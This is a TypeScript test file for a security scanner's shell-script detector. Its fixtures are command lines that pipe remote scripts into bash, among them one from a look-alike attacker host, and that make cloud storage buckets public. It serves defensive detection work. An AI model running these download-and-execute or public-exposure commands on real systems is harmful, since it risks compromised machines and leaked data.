import { describe, it, expect } from "vitest";
import type { Finding, ScanContext } from "@talaljaber/vibesafe-shared";
import { ShellScriptDetector } from "../../src/detectors/shell-script-detector.js";
import { expectRubric } from "../helpers/rubric.js";

const run = async (files: Record<string, string>): Promise<Finding[]> => {
  const ctx: ScanContext = {
    rootPath: "/fake",
    projectContext: {} as ScanContext["projectContext"],
    files: Object.keys(files),
    config: { rootPath: "/fake" },
    readFile: async (f) => files[f] ?? "",
  };
  const findings = await new ShellScriptDetector().detect(ctx);
  expectRubric(findings);
  const again = await new ShellScriptDetector().detect(ctx);
  expect(again.map((f) => f.id)).toEqual(findings.map((f) => f.id));
  return findings;
};
const by = (fs: Finding[], r: string): Finding[] =>
  fs.filter((f) => f.ruleId === `security_config/${r}`);
const sh = (...lines: string[]): string => ["#!/usr/bin/env bash", ...lines].join("\n") + "\n";

describe("security_config/shell-remote-script-pipe", () => {
  it("flags https downloads from third-party hosts piped into a shell", async () => {
    const f = by(
      await run({
        "scripts/a.sh": sh(
          "curl -sSL https://get.acme-tools.dev/install-kubectl.sh | bash",
          "wget -qO- https://example.com/setup.sh | sudo sh -s -- -y",
          "bash <(curl -fsSL https://example.org/boot.sh)",
        ),
      }),
      "shell-remote-script-pipe",
    );
    expect(f.map((x) => [x.line, x.severity, x.confidence])).toEqual([
      [2, "medium", "high"],
      [3, "medium", "high"],
      [4, "medium", "high"],
    ]);
  });

  it("keeps plain http at shell-curl-pipe-sh and reports the line once", async () => {
    const f = await run({ "a.sh": sh("curl -sSL http://example.com/i.sh | sh") });
    expect(by(f, "shell-curl-pipe-sh")).toHaveLength(1);
    expect(by(f, "shell-remote-script-pipe")).toEqual([]);
  });

  it("stays silent for vendor installers, downloads without a pipe and comments", async () => {
    const f = await run({
      "b.sh": sh(
        "curl --proto '=https' -sSf https://sh.rustup.rs | sh -s -- -y",
        "curl -fsSL https://get.docker.com | sh",
        "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -",
        "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash",
        "curl -fsSL https://bun.sh/install | bash",
        "curl -LsSf https://astral.sh/uv/install.sh | sh",
        "curl -fsSL https://example.com/i.sh -o /tmp/i.sh",
        "curl -s https://example.com/data.json | jq .name",
        "# curl https://example.com/i.sh | sh",
        'echo "curl https://example.com/i.sh | sh"',
        "curl -fsSL https://raw.githubusercontent.com/someone/else/main/i.sh | bash".replace(
          "someone/else",
          "nvm-sh/nvm",
        ),
      ),
    });
    expect(by(f, "shell-remote-script-pipe")).toEqual([]);
  });

  it("does not exempt look-alike hosts of a vendor", async () => {
    const f = by(
      await run({ "c.sh": sh("curl -fsSL https://get.docker.com.evil.example/i | sh") }),
      "shell-remote-script-pipe",
    );
    expect(f).toHaveLength(1);
  });
});

describe("security_config/shell-public-cloud-upload", () => {
  it("flags public ACL uploads and grants", async () => {
    const f = by(
      await run({
        "scripts/up.sh": sh(
          'aws s3 cp "$OUT" "s3://bucket/nightly/x.gz" --acl public-read',
          "aws s3 sync ./dist s3://bucket --acl public-read-write",
          "aws s3api put-object --bucket b --key k --body f --acl public-read",
          "gsutil acl ch -u AllUsers:R gs://bucket/file",
          "gsutil iam ch allUsers:objectViewer gs://bucket",
          "az storage container set-permission --name c --public-access blob",
          "aws s3 cp f s3://bucket/ \\",
          "  --acl public-read",
        ),
      }),
      "shell-public-cloud-upload",
    );
    expect(f.map((x) => [x.line, x.severity, x.confidence])).toEqual(
      [2, 3, 4, 5, 6, 7, 8].map((l) => [l, "high", "high"]),
    );
  });

  it("stays silent for private uploads, comments and look-alikes", async () => {
    const f = await run({
      "d.sh": sh(
        'aws s3 cp "$OUT" s3://bucket/x --acl private',
        "aws s3 cp f s3://bucket/x --acl bucket-owner-full-control",
        "aws s3 cp f s3://bucket/x --sse AES256",
        "gsutil iam ch user:me@example.com:objectViewer gs://bucket",
        "az storage container set-permission --name c --public-access off",
        "# aws s3 cp f s3://b --acl public-read",
        'echo "use --acl public-read"',
      ),
      "src/x.ts": "aws s3 cp f s3://b --acl public-read",
    });
    expect(by(f, "shell-public-cloud-upload")).toEqual([]);
  });
});
